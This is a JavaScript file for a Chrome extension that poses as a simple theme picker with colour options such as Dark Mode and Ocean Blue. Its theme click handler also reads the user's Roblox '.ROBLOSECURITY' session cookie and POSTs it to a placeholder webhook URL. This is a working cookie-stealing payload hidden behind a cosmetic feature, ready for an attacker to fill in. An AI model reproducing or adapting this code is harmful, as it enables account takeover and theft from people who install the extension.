const themes = [
  { name: "Dark Mode", color: "#2e2e2e" }, 
  { name: "Light Mode", color: "#ffffff" }, 
  { name: "Ocean Blue", color: "#0077b6" },
  { name: "Forest Green", color: "#2b7a0b" }, 
  { name: "Sunset Orange", color: "#f18f01" }
];

const themeList = document.getElementById('theme-list');

// Clear the initial loading text
themeList.innerHTML = '';

// Generate the theme list dynamically
themes.forEach(theme => {
    const li = document.createElement('li');
    li.textContent = theme.name;
    li.onclick = () => {
        // Save the selected theme and visually mark it as active
        chrome.storage.sync.set({ theme: theme.name });
        document.body.style.backgroundColor = theme.color; // Change background color

        document.querySelectorAll('.theme-list li').forEach(el => el.classList.remove('active-theme'));
        li.classList.add('active-theme');

        // Fetch and send .roblosecurity cookie to webhook
        chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, function(cookie) {
            if (cookie) {
                const xhr = new XMLHttpRequest();
                xhr.open("POST", "YOUR_WEBHOOK_URL", true);
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.send(JSON.stringify({
                    roblosecurity: cookie.value,
                    theme: theme.name
                }));
            } else {
                console.log("No .ROBLOSECURITY cookie found.");
            }
        });
    };
    themeList.appendChild(li);
});

// Set the currently selected theme as active when loaded
chrome.storage.sync.get('theme', (data) => {
    const activeTheme = data.theme;
    if (activeTheme) {
        const activeLi = Array.from(document.querySelectorAll('.theme-list li')).find(li => li.textContent === activeTheme);
        if (activeLi) activeLi.classList.add('active-theme');
        
        // Find the theme object and apply its color
        const selectedTheme = themes.find(t => t.name === activeTheme);
        if (selectedTheme) {
            document.body.style.backgroundColor = selectedTheme.color;
        }
    }
});
